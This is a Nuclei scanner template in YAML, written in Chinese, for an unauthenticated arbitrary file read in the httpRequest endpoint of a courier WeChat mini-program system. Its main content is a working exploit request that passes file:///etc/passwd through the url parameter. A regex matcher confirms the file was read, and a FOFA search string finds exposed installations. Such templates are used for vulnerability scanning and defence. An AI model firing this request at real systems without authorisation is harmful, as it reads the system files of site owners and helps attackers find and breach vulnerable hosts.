id: kuaidi-wechat-app-fileread

info:
  name: 快递微信小程序系统httpRequest任意文件读取漏洞
  author: qwtd
  severity: high
  description: |-
    快递微信小程序系统 httpRequest 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统文件。
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%BF%AB%E9%80%92/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9FhttpRequest%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa: body="static/default/newwap/lang/js/jquery.localize.min.js"
  tags: 快递微信小程序

http:
  - raw:
      - |
        GET /weixin/index/httpRequest?url=file:///etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br, zstd
        Connection: keep-alive

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"